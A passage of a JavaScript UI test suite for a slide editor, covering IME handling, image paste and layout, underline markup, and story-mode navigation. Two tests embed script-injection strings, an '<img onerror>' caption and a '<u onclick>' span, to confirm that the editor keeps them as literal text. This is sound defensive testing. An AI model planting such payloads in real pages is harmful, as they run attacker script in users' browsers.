      await _mrdInject([{ type: "heading", text: "HFE ime" }, { type: "cycle", items: [{ label: "HFEa" }, { label: "HFEb" }, { label: "HFEc" }] }], null, (vp) => vp?.textContent.includes("HFEc") ? vp : null);
      await _wait(400);
      _click(await _waitFor(() => _tlEditNode("HFE ime"), 2000));
      const ed = await _waitFor(() => _$("[contenteditable='true']", _mrdViewport()), 1500);
      ime(ed); await _mrdFrame();
      if (!ed.isConnected || !ed.isContentEditable) throw new Error("a composing Enter closed the inline text editor");
      enter(ed);
      await _waitFor(() => !_$("[contenteditable='true']", _mrdViewport()), 1500).catch(() => { throw new Error("a plain Enter did not commit the inline text editor"); });
      const lbl = await _waitFor(() => Array.from(_mrdViewport().querySelectorAll("text[data-svg-edit]")).find((t) => t.textContent.trim() === "HFEa"), 2000);
      lbl.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
      const inp = await _waitFor(() => _$("[data-testid='svg-text-edit']", _mrdViewport()), 1500);
      ime(inp); await _mrdFrame();
      if (!_$("[data-testid='svg-text-edit']", _mrdViewport())) throw new Error("a composing Enter closed the SVG label editor");
      enter(_$("[data-testid='svg-text-edit']", _mrdViewport()));
      await _waitFor(() => !_$("[data-testid='svg-text-edit']", _mrdViewport()), 1500).catch(() => { throw new Error("a plain Enter did not commit the SVG label editor"); });
    } finally {
      document.activeElement?.blur?.();
      await _mrdUndoTo(past);
    }
  }},
], { setup: _selectFirstModule });

// ── Bug-hunt round 1 fixes: image paste and placement ───────────────────
const _h1Heavy = [{ type: "heading", text: "H1 heavy" }, { type: "bullets", items: ["one long bullet point with lots of words in it to wrap", "two long bullet point with lots of words in it to wrap", "three long bullet point with lots of words in it", "four long bullet point with lots of words in it", "five long bullet point with lots of words", "six long bullet point with lots of words", "seven long bullet point"] }, { type: "text", text: "Footer text that must stay on the slide." }];
const _h1CellWidths = (vp) => Array.from(vp.querySelectorAll("[data-testid='image-grid-cell']")).map((c) => c.getBoundingClientRect().width);
const _h1Imgs = (vp) => Array.from(vp.querySelectorAll("img")).filter((im) => im.complete && im.naturalWidth > 0);
const _h1Paste = (files) => {
  const dt = new DataTransfer(); files.forEach((f) => dt.items.add(f));
  _mrdViewport().dispatchEvent(new ClipboardEvent("paste", { clipboardData: dt, bubbles: true, cancelable: true }));
};
const _h1Heading = async (mark) => _mrdInject([{ type: "heading", text: mark }], { imageCols: undefined }, (vp) => vp?.textContent.includes(mark) && !vp.querySelector("img") ? vp : null);
uiSuite("hunt1-fix-image", [
  { name: "HI1: same-aspect photos next to a wide banner are drawn at the same size", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const blocks = [{ type: "image", src: _rfiSrc(1200, 200, 0) }, ...[1, 2, 3, 4].map((k) => ({ type: "image", src: _rfiSrc(400, 300, k) }))];
      await _mrdInject(blocks, { imageCols: undefined }, (v) => _tlLoaded(v) === 5 ? v : null);
      await _wait(500); await _mrdFrame();
      const photos = _tlMeasure().imgs.slice(1).map((i) => i.w);
      if (photos.length !== 4) throw new Error(`${photos.length} photos rendered`);
      if (Math.min(...photos) < 0.98 * Math.max(...photos)) throw new Error(`photo widths differ: ${photos.map((w) => w.toFixed(0)).join(", ")}`);
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI2: wide banners under heavy text shrink; the text keeps its size", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      let vp = await _mrdInject(_h1Heavy, { imageCols: undefined }, (v) => v?.textContent.includes("H1 heavy") && !v.querySelector("img") ? v : null);
      await _wait(300); await _mrdFrame();
      const h0 = vp.querySelector("[data-block-type='heading']").getBoundingClientRect().height;
      const banners = [0, 1, 2, 3].map((k) => ({ type: "image", src: _rfiSrc(2000, 100, k) }));
      vp = await _mrdInject([..._h1Heavy, ...banners], { imageCols: undefined }, (v) => _tlLoaded(v) === 4 ? v : null);
      await _wait(600); await _mrdFrame();
      const h1 = vp.querySelector("[data-block-type='heading']").getBoundingClientRect().height, m = _tlMeasure();
      if (m.outside) throw new Error(`${m.outside} text block(s) off the slide`);
      if (h1 < 0.97 * h0) throw new Error(`the text was scaled down: heading ${h0.toFixed(1)} -> ${h1.toFixed(1)} px`);
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI3: an evicted image aspect is measured again; the on-screen grid does not change", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const blocks = [{ type: "image", src: _rfiSrc(150, 450, 0) }, { type: "image", src: _rfiSrc(640, 360, 1) }];
      let vp = await _mrdInject(blocks, { imageCols: undefined }, (v) => _tlLoaded(v) === 2 ? v : null);
      await _wait(500); await _mrdFrame();
      const before = _h1CellWidths(vp);
      if (!(before.length === 2 && before[1] > 2 * before[0])) throw new Error(`precondition: expected aspect-sized cells, got ${before.map((w) => w.toFixed(0)).join(", ")}`);
      blocks.forEach((b) => IMAGE_ASPECT_CACHE.delete(b.src));
      // Re-render without a layout change (speakerNotes is not a layout input).
      vp = await _mrdInject(blocks, { imageCols: undefined, speakerNotes: "h1-hi3" }, (v) => v);
      await _wait(500); await _mrdFrame();
      const after = _h1CellWidths(vp);
      if (!blocks.every((b) => IMAGE_ASPECT_CACHE.has(b.src))) throw new Error("the evicted aspects were not measured again");
      if (after.some((w, k) => Math.abs(w - before[k]) > 1)) throw new Error(`grid changed after eviction: ${before.map((w) => w.toFixed(0))} -> ${after.map((w) => w.toFixed(0))}`);
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI4: a corrupt image with an allowed type shows a notice and adds no block", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      await _h1Heading("H1-HI4");
      _h1Paste([new File(["this is not a png at all, garbage bytes"], "bad.png", { type: "image/png" })]);
      _h1Paste([await _rfiPng(140, 90, 1)]);
      const notice = await _waitFor(() => document.querySelector("[data-testid='paste-notice']"), 4000).catch(() => null);
      await _waitFor(() => _h1Imgs(_mrdViewport()).length >= 1, 5000).catch(() => {});
      await _wait(400);
      const n = _mrdViewport().querySelectorAll("[data-block-type='image']").length;
      if (n !== 1) throw new Error(`${n} image block(s) on the slide (expected 1)`);
      if (!notice) throw new Error("no notice for the image that could not be pasted");
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI6: one paste event with two images pastes both, in order", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      await _h1Heading("H1-HI6");
      _h1Paste([await _rfiPng(140, 90, 0), await _rfiPng(220, 90, 1)]);
      let got = [];
      await _waitFor(() => { got = _h1Imgs(_mrdViewport()).map((im) => im.naturalWidth); return got.length >= 2; }, 5000).catch(() => {});
      if (got.join(",") !== "140,220") throw new Error(`images on the slide: ${got.join(",") || "none"} (expected 140,220)`);
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI7: a transparent PNG keeps its transparency", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      await _h1Heading("H1-HI7");
      const cv = document.createElement("canvas"); cv.width = 200; cv.height = 100;
      const g = cv.getContext("2d"); g.fillStyle = "#3b82f6"; g.fillRect(40, 20, 120, 60);
      const blob = await new Promise((r) => cv.toBlob(r, "image/png"));
      _h1Paste([new File([blob], "alpha.png", { type: "image/png" })]);
      const img = await _waitFor(() => _h1Imgs(_mrdViewport())[0], 5000);
      if (!/^data:image\/png;base64,/.test(img.getAttribute("src"))) throw new Error(`stored as ${img.getAttribute("src").slice(0, 22)}`);
      const t = document.createElement("canvas"); t.width = img.naturalWidth; t.height = img.naturalHeight;
      const tg = t.getContext("2d"); tg.drawImage(img, 0, 0);
      const corner = tg.getImageData(0, 0, 1, 1).data[3], mid = tg.getImageData(100, 50, 1, 1).data[3];
      if (corner !== 0 || mid !== 255) throw new Error(`alpha corner ${corner} / center ${mid} (expected 0 / 255)`);
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "HI8: pastes queued before a module switch land on their original slide, in order", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      await _h1Heading("H1-HI8");
      const rows = _$$(".concept-row");
      if (rows.length < 2) throw new Error("the test deck needs two modules");
      const from = _hooks().getSelection();
      const files = [await _rfiPng(120, 90, 0), await _rfiPng(160, 90, 1), await _rfiPng(200, 90, 2)];
      files.forEach((f) => _h1Paste([f]));
      _click(rows[1]);
      await _waitFor(() => { const s = _hooks().getSelection(); return s && s.itemId !== from.itemId; }, 2000);
      await _wait(2500);
      _click(rows[0]);
      await _waitFor(() => { const s = _hooks().getSelection(); return s && s.itemId === from.itemId; }, 2000);
      const vp = await _waitFor(() => { const v = _mrdViewport(); return v?.textContent.includes("H1-HI8") && _h1Imgs(v).length >= 3 ? v : null; }, 4000).catch(() => null);
      const got = vp ? _h1Imgs(vp).map((im) => im.naturalWidth).join(",") : "none";
      if (got !== "120,160,200") throw new Error(`images on the original slide: ${got} (expected 120,160,200)`);
    } finally { await _mrdUndoTo(past); }
  }},
], { setup: _selectFirstModule });

// ── WP7: Ctrl+U underline is saved as ++text++ and shows underlined ──
// (This whole part is release-excluded by concat.py --release.)
const _ulSaved = (marker) => {
  const snap = _hooks().capturePostDemoFlushForTest?.();
  let hit = null;
  const walk = (v) => {
    if (hit) return;
    if (typeof v === "string") { if (v.includes(marker)) hit = v; }
    else if (v && typeof v === "object") for (const k of Object.keys(v)) walk(v[k]);
  };
  walk(snap && snap.state);
  return hit;
};
const _ulOpenEditor = async (vp, shown, partial) => {
  const disp = Array.from(vp.querySelectorAll("[data-block-type='text'] div")).find((d) => (partial ? d.textContent.includes(shown) : d.textContent === shown) && d.style.cursor === "pointer");
  if (!disp) throw new Error("text block is not editable");
  _click(disp);
  const ed = await _waitFor(() => vp.querySelector("[data-block-type='text'] [contenteditable]"), 1500);
  ed.focus();
  return ed;
};
uiSuite("wp7-underline", [
  { name: "Ctrl+U saves ++text++, renders an underlined span, undo restores", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const vp = await _mrdInject([{ type: "text", text: "WP7U base" }], { layout: undefined }, (v) => v?.textContent.includes("WP7U base") ? v : null);
      const afterInject = _hooks().getHistoryCounts().past;
      const ed = await _ulOpenEditor(vp, "WP7U base");
      const sel = window.getSelection(); sel.selectAllChildren(ed); sel.collapseToEnd();
      document.execCommand("insertText", false, " under");
      const tw = document.createTreeWalker(ed, NodeFilter.SHOW_TEXT);
      let tn = null;
      while (tw.nextNode()) if (tw.currentNode.textContent.includes("under")) tn = tw.currentNode;
      if (!tn) throw new Error("typed text not found");
      const at = tn.textContent.lastIndexOf("under");
      const r = document.createRange(); r.setStart(tn, at); r.setEnd(tn, at + 5);
      sel.removeAllRanges(); sel.addRange(r);
      const ev = new KeyboardEvent("keydown", { key: "u", ctrlKey: true, bubbles: true, cancelable: true });
      ed.dispatchEvent(ev);
      if (!ev.defaultPrevented) throw new Error("Ctrl+U was not handled by the editor");
      if (!ed.querySelector("u")) throw new Error("Ctrl+U did not underline the selection");
      ed.blur();
      const saved = await _waitFor(() => _ulSaved("WP7U base") === "WP7U base ++under++" ? true : null, 2000)
        .catch(() => { throw new Error(`saved text is ${JSON.stringify(_ulSaved("WP7U base"))}`); });
      if (!saved) throw new Error("not saved");
      const span = await _waitFor(() => _mrdViewport().querySelector("[data-block-type='text'] span[data-vela-u]"), 1500);
      if (span.textContent !== "under" || !getComputedStyle(span).textDecorationLine.includes("underline"))
        throw new Error("rendered text has no underlined span");
      if (_mrdViewport().textContent.includes("++")) throw new Error("the ++ markers are visible");
      if (_hooks().getHistoryCounts().past !== afterInject + 1) throw new Error("the edit did not make one undo step");
      _key("z", { ctrlKey: true });
      await _waitFor(() => !_mrdViewport().querySelector("span[data-vela-u]") && _ulSaved("WP7U base") === "WP7U base", 2000)
        .catch(() => { throw new Error("undo did not restore the text without underline"); });
    } finally { await _mrdUndoTo(past); }
  }},
  { name: "literal C++ / i++ stay text; deck markup stays literal in the editor", fn: async () => {
    const past = _hooks().getHistoryCounts().past;
    try {
      const txt = 'C++ and i++ <u onclick="window.__wp7ul=1">z</u> ++y++';
      const vp = await _mrdInject([{ type: "text", text: txt }], { layout: undefined }, (v) => v?.textContent.includes("C++ and i++") ? v : null);
      const spans = vp.querySelectorAll("[data-block-type='text'] span[data-vela-u]");
      if (spans.length !== 1 || spans[0].textContent !== "y") throw new Error(`expected one underline span "y", got ${spans.length}`);
      if (vp.querySelector("[data-block-type='text'] u")) throw new Error("deck <u> became markup");
      // Ingress sanitizing may strip the tag text; either way it must never be markup.
      const ed = await _ulOpenEditor(vp, "C++ and i++", true);
      const us = ed.querySelectorAll("u");
      if (us.length !== 1 || us[0].textContent !== "y" || us[0].attributes.length) throw new Error("editor HTML has deck markup");
      if (ed.querySelector("[onclick]")) throw new Error("deck markup became live in the editor");
      ed.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
      await _waitFor(() => !_$("[contenteditable='true']"), 1500);
      if (window.__wp7ul) throw new Error("deck handler ran");
    } finally { await _mrdUndoTo(past); }
  }},
], { setup: _selectFirstModule });

// ── WP5: story images, image file drop, tile reorder ────────────────────
// A story slide is set up on the second slide, so a previous slide exists for
// the back path. Each test exits Present and undoes its own history steps.
const _wp5Sel = () => _hooks().getSelection?.() || null;
const _wp5Key = () => { const s = _wp5Sel(); return s ? `${s.itemId}|${s.slideIdx}` : null; };
const _wp5Deck = () => _hooks().getDeckStateForTest?.() || {};
const _wp5Fs = () => !!_wp5Deck().fullscreen;
const _wp5Cur = () => _hooks().getCurrentSlideForTest?.() || null;
const _wp5ImgSrcs = () => ((_wp5Cur() || {}).blocks || []).filter((b) => b.type === "image").map((b) => b.src);
const _wp5Imgs = (n, cap) => Array.from({ length: n }, (_, k) => ({ type: "image", src: _rfiSrc(160 + 40 * k, 90, k), ...(cap && cap(k) ? { caption: cap(k) } : {}) }));
const _wp5Inject = (mark, n, extra, cap) => _mrdInject([{ type: "heading", text: mark }, ..._wp5Imgs(n, cap)], { imageCols: undefined, story: undefined, ...(extra || {}) },
  (vp) => vp?.textContent.includes(mark) && vp.querySelectorAll("img").length >= n ? vp : null);
const _wp5UndoTo = async (past) => {
  const h = _hooks();
  document.activeElement?.blur?.();
  for (let i = 0; i < 40 && h.getHistoryCounts && h.getHistoryCounts().past > past; i++) { _key("z", { ctrlKey: true }); await _wait(50); }
};
const _wp5Enter = async () => {
  document.activeElement?.blur?.(); await _wait(60);
  _key("f");
  await _waitFor(() => _wp5Fs() && !_$("header"), 2500).catch(() => { throw new Error("did not enter Present"); });
  await _mrdFrame();
};
const _wp5Exit = async () => {
  for (let i = 0; i < 8 && _wp5Fs(); i++) { document.activeElement?.blur?.(); _key("Escape"); await _wait(150); }
  if (_wp5Fs()) throw new Error("could not exit Present");
  await _waitFor(() => _$("header"), 2000).catch(() => {});
};
const _wp5Layer = (root = document) => _$("[data-story-layer]", root);
const _wp5CurThumb = (root = document) => _$("[data-story-rail] [aria-current='true']", root);
const _wp5ZoomedAt = (k, root = document) => { const l = _wp5Layer(root); return !!l && l.style.pointerEvents === "auto" && _wp5CurThumb(root)?.getAttribute("aria-label") === `Image ${k}`; };
const _wp5Grid = () => !_wp5Layer();
const _wp5Step = async (key, want, label) => {
  document.activeElement?.blur?.();
  _key(key);
  await _waitFor(want, 2500).catch(() => { throw new Error(`${key} → ${label}: not reached (layer=${!!_wp5Layer()}, current=${_wp5CurThumb()?.getAttribute("aria-label") || "-"}, slide=${_wp5Key()})`); });
};
// Run body on a fresh story slide (the second slide of the deck), then clean up.
const _wp5OnSlide = async (mark, n, extra, body, cap) => {
  await _wp5Exit(); await _selectFirstModule();
  const k0 = _wp5Key();
  document.activeElement?.blur?.(); _key("ArrowRight");
  await _waitFor(() => _wp5Key() && _wp5Key() !== k0, 2500).catch(() => { throw new Error("could not move to the second slide"); });
  const past = _hooks().getHistoryCounts().past;
  const mm = window.matchMedia;
  try {
    const vp = await _wp5Inject(mark, n, extra, cap);
    await body(vp, past);
  } finally {
    window.matchMedia = mm;
    await _wp5Exit().catch(() => {});
    await _wp5UndoTo(past);
  }
};
const _wp5Toast = (re) => _$$(".nav-toast-in, .nav-toast-out, [data-testid='paste-notice']").map((t) => (t.textContent || "").trim()).find((t) => re.test(t)) || null;
const _wp5Drop = (target, files, types = ["dragenter", "dragover", "drop"]) => {
  const dt = new DataTransfer(); files.forEach((f) => dt.items.add(f));
  const evs = types.map((type) => { const ev = new DragEvent(type, { dataTransfer: dt, bubbles: true, cancelable: true }); target.dispatchEvent(ev); return ev; });
  return evs[evs.length - 1];
};
const _wp5Aspect = (src) => new Promise((res) => { const im = new Image(); im.onload = () => res(im.naturalHeight > 0 ? im.naturalWidth / im.naturalHeight : 0); im.onerror = () => res(0); im.src = src; });
const _wp5NoBlob = () => { const b = _$$("img").find((im) => /^blob:/i.test(im.getAttribute("src") || "")); if (b) throw new Error("an img uses a blob: URL"); };

uiSuite("wp5-story-present-nav", [
  { name: "→ steps grid → image 1..4 → grid → next slide; rail has 4 thumbs, one current", fn: async () => {
    await _wp5OnSlide("WP5 nav fwd", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      if (_wp5Key() !== here) throw new Error("Present did not open on the story slide");
      if (_wp5Layer()) throw new Error("the story slide opened zoomed, expected the grid");
      if (_$("[data-story-rail]")) throw new Error("the index rail shows on the grid");
      for (let k = 1; k <= 4; k++) {
        await _wp5Step("ArrowRight", () => _wp5ZoomedAt(k), `image ${k}`);
        const thumbs = _$$("[data-story-rail] button");
        if (thumbs.length !== 4) throw new Error(`rail has ${thumbs.length} thumbs, expected 4`);
        if (thumbs.filter((b) => b.getAttribute("aria-current") === "true").length !== 1) throw new Error("rail does not mark exactly one current thumb");
        const zsrc = _$("[data-story-image] img")?.getAttribute("src"), tsrc = _$(`[data-story-idx='${k}'] img`)?.getAttribute("src");
        if (!zsrc || zsrc !== tsrc) throw new Error(`zoomed image ${k} is not the tile ${k} image`);
        if (_wp5Key() !== here) throw new Error(`left the slide at image ${k}`);
      }
      await _wp5Step("ArrowRight", _wp5Grid, "grid after image 4");
      if (_wp5Key() !== here) throw new Error("left the slide before the final grid");
      await _wp5Step("ArrowRight", () => _wp5Key() !== here, "next slide");
    });
  }},
  { name: "← enters on the grid (k=N), zooms 4..1, grid, then previous slide", fn: async () => {
    await _wp5OnSlide("WP5 nav back", 4, { story: true }, async () => {
      const here = _wp5Key();
      document.activeElement?.blur?.(); _key("ArrowRight"); // editor: plain slide nav
      await _waitFor(() => _wp5Key() !== here, 2000);
      await _wp5Enter();
      await _wp5Step("ArrowLeft", () => _wp5Key() === here && _wp5Grid(), "story slide grid");
      for (let k = 4; k >= 1; k--) await _wp5Step("ArrowLeft", () => _wp5ZoomedAt(k), `image ${k}`);
      await _wp5Step("ArrowLeft", _wp5Grid, "grid before image 1");
      if (_wp5Key() !== here) throw new Error("left the slide before the first grid");
      await _wp5Step("ArrowLeft", () => _wp5Key() !== here, "previous slide");
    });
  }},
  { name: "Esc zooms out first and → resumes at k+1; a thumb and a tile click jump", fn: async () => {
    await _wp5OnSlide("WP5 nav esc", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1");
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(2), "image 2");
      await _wp5Step("Escape", _wp5Grid, "grid after Esc");
      if (!_wp5Fs()) throw new Error("Esc while zoomed left Present");
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(3), "image 3 (resume)");
      _click(_$$("[data-story-rail] button")[3]);
      await _waitFor(() => _wp5ZoomedAt(4), 2000).catch(() => { throw new Error("rail thumb 4 did not jump to image 4"); });
      _click(_wp5Layer());
      await _waitFor(_wp5Grid, 2000).catch(() => { throw new Error("a click on the zoomed image did not zoom out"); });
      _click(_$("[data-story-idx='2'] img"));
      await _waitFor(() => _wp5ZoomedAt(2), 2000).catch(() => { throw new Error("a tile click did not jump to image 2"); });
      if (_$("[data-vela-zoom]")) throw new Error("a story tile click also opened the gallery zoom");
      if (_wp5Key() !== here) throw new Error("left the slide");
    });
  }},
]);

uiSuite("wp5-story-off-unchanged", [
  { name: "story OFF: arrows go slide to slide, a tile click opens the old zoom, no rail", fn: async () => {
    await _wp5OnSlide("WP5 off", 4, {}, async () => {
      const here = _wp5Key();
      if (_$("[data-story-idx]")) throw new Error("story numbering on a story-off slide");
      await _wp5Enter();
      await _wp5Step("ArrowRight", () => _wp5Key() !== here, "next slide");
      if (_wp5Layer()) throw new Error("story layer on a story-off slide");
      await _wp5Step("ArrowLeft", () => _wp5Key() === here, "back to the slide");
      _click(_$$("[data-testid='image-grid-cell'] img")[0]);
      await _waitFor(() => _$("[data-vela-zoom]"), 2000).catch(() => { throw new Error("tile click did not open the gallery zoom"); });
      if (_$("[data-story-rail]") || _wp5Layer()) throw new Error("story rail shows on a story-off slide");
      _click(_$("[data-vela-zoom]"));
      await _waitFor(() => !_$("[data-vela-zoom]"), 2000).catch(() => { throw new Error("gallery zoom did not close"); });
    });
  }},
]);

uiSuite("wp5-story-editor", [
  { name: "editor: arrows change slides and never step the story", fn: async () => {
    await _wp5OnSlide("WP5 editor nav", 4, { story: true }, async () => {
      const here = _wp5Key();
      if (_$("[data-testid='story-toggle']")?.getAttribute("aria-pressed") !== "true") throw new Error("story toggle is not pressed on a story slide");
      await _wp5Step("ArrowRight", () => _wp5Key() !== here, "next slide");
      if (_wp5Layer()) throw new Error("editor stepped the story");
      await _wp5Step("ArrowLeft", () => _wp5Key() === here, "back");
      await _wait(200);
      if (_wp5Layer()) throw new Error("editor shows a story zoom layer");
    });
  }},
  { name: "story toggle sets story:true, one undo restores; hidden with < 2 images", fn: async () => {
    await _wp5OnSlide("WP5 toggle", 3, {}, async () => {
      const btn = await _waitFor(() => _$("[data-testid='story-toggle']"), 2000).catch(() => { throw new Error("story toggle not shown for 3 images"); });
      if (btn.getAttribute("aria-pressed") !== "false") throw new Error("toggle pressed on a story-off slide");
      if (_$("[data-testid='story-preview']")) throw new Error("Preview story shown while story is off");
      const p1 = _hooks().getHistoryCounts().past;
      _click(btn);
      await _waitFor(() => _wp5Cur()?.story === true && _$("[data-testid='story-toggle']")?.getAttribute("aria-pressed") === "true" && _$("[data-testid='story-preview']"), 2000)
        .catch(() => { throw new Error("toggle did not set story:true"); });
      if (_hooks().getHistoryCounts().past !== p1 + 1) throw new Error("toggle did not make exactly one undo step");
      document.activeElement?.blur?.(); _key("z", { ctrlKey: true });
      await _waitFor(() => _wp5Cur()?.story !== true && _$("[data-testid='story-toggle']")?.getAttribute("aria-pressed") === "false", 2000)
        .catch(() => { throw new Error("one undo did not restore story off"); });
      await _wp5Inject("WP5 toggle one", 1);
      await _wait(150);
      if (_$("[data-testid='story-toggle']")) throw new Error("story toggle shown with 1 image");
    });
  }},
]);

uiSuite("wp5-story-presenter", [
  { name: "presenter NOW shows the story step, NEXT says image k/N then overview", fn: async () => {
    await _wp5OnSlide("WP5 presenter", 4, { story: true }, async () => {
      const here = _wp5Key();
      await _wp5Enter();
      document.activeElement?.blur?.(); _key("s");
      const pv = await _waitFor(() => _$("[data-testid='presenter-view']"), 2000);
      const label = () => (_$("[data-testid='presenter-next-story']")?.textContent || "").trim() || null;
      const nowLayer = () => _$$("[data-story-layer]", pv).find((l) => !l.closest("[data-testid='presenter-next']")) || null;
      await _waitFor(() => label() === "image 1/4", 2000).catch(() => { throw new Error(`NEXT label on the grid is ${JSON.stringify(label())}`); });
      if (nowLayer()) throw new Error("NOW is zoomed on the grid step");
      // Presenter thumbs have no jump, so their rail items are not buttons.
      for (let k = 1; k <= 4; k++) {
        const want = k < 4 ? `image ${k + 1}/4` : "overview";
        document.activeElement?.blur?.(); _key("ArrowRight");
        await _waitFor(() => label() === want && nowLayer(), 2000).catch(() => { throw new Error(`at image ${k}: NEXT=${JSON.stringify(label())}, NOW zoomed=${!!nowLayer()}`); });
        const items = _$$("[data-story-rail] > *", nowLayer());
        const cur = items.findIndex((x) => x.getAttribute("aria-current") === "true");
        if (items.length !== 4 || cur !== k - 1) throw new Error(`NOW rail current is ${cur + 1} of ${items.length}, expected ${k} of 4`);
      }
      document.activeElement?.blur?.(); _key("ArrowRight");
      await _waitFor(() => !label() && !nowLayer(), 2000).catch(() => { throw new Error("final grid: NEXT should be the next slide"); });
      if (_wp5Key() !== here) throw new Error("left the slide too early");
      await _wp5Step("ArrowRight", () => _wp5Key() !== here, "next slide");
    });
  }},
]);

uiSuite("wp5-caption-chip", [
  { name: "editor hover shows \"+ Add title\" with no layout shift; typing sets the caption", fn: async () => {
    await _wp5OnSlide("WP5 chip", 2, {}, async (vp) => {
      const cell = _$$("[data-testid='image-grid-cell']", vp)[0];
      if (!cell) throw new Error("no grid cell");
      if (_$("[data-testid='caption-chip']")) throw new Error("chip shown before hover");
      const r0 = cell.getBoundingClientRect();
      cell.querySelector("img").dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
      const chip = await _waitFor(() => _$("[data-testid='caption-chip']", cell), 2000).catch(() => { throw new Error("hover did not show the chip"); });
      if ((chip.textContent || "").trim() !== "+ Add title") throw new Error(`chip text is ${JSON.stringify(chip.textContent)}`);
      if (getComputedStyle(chip).position !== "absolute") throw new Error("chip is not absolutely positioned");
      const r1 = cell.getBoundingClientRect();
      if (Math.abs(r0.height - r1.height) > 0.5 || Math.abs(r0.width - r1.width) > 0.5) throw new Error("chip changed the tile size");
      _click(chip);
      const ed = await _waitFor(() => _$("[contenteditable='true']", cell), 2000).catch(() => { throw new Error("chip click did not open an inline editor"); });
      ed.focus();
      document.execCommand("insertText", false, "WP5 title");
      ed.blur();
      await _waitFor(() => (_wp5Cur()?.blocks || [])[1]?.caption === "WP5 title", 2000).catch(() => { throw new Error(`caption is ${JSON.stringify((_wp5Cur()?.blocks || [])[1]?.caption)}`); });
      await _waitFor(() => vp.textContent.includes("WP5 title"), 1500);
    });
  }},
  { name: "no chip in Present, also with present edit ON", fn: async () => {
    await _wp5OnSlide("WP5 chip present", 2, {}, async () => {
      await _wp5Enter();
      document.activeElement?.blur?.(); _key("E", { shiftKey: true });
      await _waitFor(() => _wp5Toast(/Edit mode ON/), 2000).catch(() => { throw new Error("present edit did not turn ON"); });
      try {
        for (const im of _$$("[data-testid='image-grid-cell'] img")) im.dispatchEvent(new MouseEvent("mouseover", { bubbles: true }));
        await _wait(250);
        if (_$("[data-testid='caption-chip']")) throw new Error("caption chip rendered in Present with present edit ON");
      } finally { document.activeElement?.blur?.(); _key("E", { shiftKey: true }); await _wait(150); }
    });
  }},
  { name: "markup-like caption renders as literal text; no element, no handler", fn: async () => {
    window.__wp5xss = 0;
    const xss = '<img src=x onerror="window.__wp5xss=1">';
    await _wp5OnSlide("WP5 xss", 2, { story: true }, async (vp) => {
      const stored = (_wp5Cur()?.blocks || [])[1]?.caption || "";
      const check = (root) => {
        if (_$$("img", root).some((im) => !/^data:image\//.test(im.getAttribute("src") || ""))) throw new Error("caption created an img element");
        if (_$("[onerror]", root)) throw new Error("caption created a handler attribute");
      };
      await _wait(300);
      check(vp);
      if (_$$("img", vp).length !== 2) throw new Error(`expected 2 tile imgs, got ${_$$("img", vp).length}`);
      if (stored && !vp.textContent.includes(stored)) throw new Error("caption is not rendered as literal text");
      // The story number is its own text node, never part of the caption string.
      const tw = document.createTreeWalker(vp, NodeFilter.SHOW_TEXT);
      let prefix = false;
      while (tw.nextNode()) if (tw.currentNode.textContent === "1 · ") prefix = true;
      if (stored && !prefix) throw new Error("story prefix is not a separate text node");
      await _wp5Enter();
      await _wp5Step("ArrowRight", () => _wp5ZoomedAt(1), "image 1");
      await _wait(200);
      check(document.body);
      if ((_wp5Layer()?.textContent || "").includes("onerror")) throw new Error("caption shows inside the zoom layer");
      if (window.__wp5xss) throw new Error("caption handler ran");
    }, (k) => (k === 0 ? xss : null));
    if (window.__wp5xss) throw new Error("caption handler ran");
  }},
]);

uiSuite("wp5-image-paste-spill", [
  { name: "paste 12 images: 10 here, 2 on a new story slide after it, toast", fn: async () => {
    await _wp5Exit(); await _selectFirstModule();
    const past = _hooks().getHistoryCounts().past;
    const home = _wp5Key();
    try {
      const mark = "WP5 paste spill";
      await _mrdInject([{ type: "heading", text: mark }], { imageCols: undefined, story: true }, (vp) => vp?.textContent.includes(mark) && !vp.querySelector("img") ? vp : null);
      const files = [];
      for (let k = 0; k < 12; k++) files.push(await _rfiPng(120 + 10 * k, 80, k));
      _h1Paste(files);
      const msg = await _waitFor(() => _wp5Toast(/Added \d+ here · \d+ on new slide \d+/), 20000).catch(() => { throw new Error("no spill toast"); });
      const m = msg.match(/Added (\d+) here · (\d+) on new slide (\d+)/);
      if (m[1] !== "10" || m[2] !== "2") throw new Error(`toast says ${JSON.stringify(msg)}`);
      await _waitFor(() => _wp5ImgSrcs().length === 2, 3000).catch(() => { throw new Error(`spill slide has ${_wp5ImgSrcs().length} images`); });
      const spill = _wp5Cur(), sel = _wp5Sel();
      if (spill.story !== true) throw new Error("spill slide did not inherit story:true");
      if (sel.slideIdx + 1 !== Number(m[3])) throw new Error(`toast names slide ${m[3]}, spill is slide ${sel.slideIdx + 1}`);
      document.activeElement?.blur?.(); _key("ArrowLeft");
      await _waitFor(() => _wp5Key() === home, 2000).catch(() => { throw new Error("spill slide is not right after the pasted slide"); });
      const src = _wp5ImgSrcs();
      if (src.length !== 10) throw new Error(`pasted slide has ${src.length} images, expected 10`);
      if (!src.every((s) => SAFE_RASTER_DATA_IMAGE.test(s))) throw new Error("a pasted src is not a safe raster data URI");
    } finally {
      await _wp5UndoTo(past);
      await _selectFirstModule();
    }
  }},
]);

uiSuite("wp5-tile-reorder", [
  { name: "drag a tile handle: live reflow, one edit, one undo restores", fn: async () => {
    await _wp5OnSlide("WP5 reorder", 3, {}, async (vp) => {
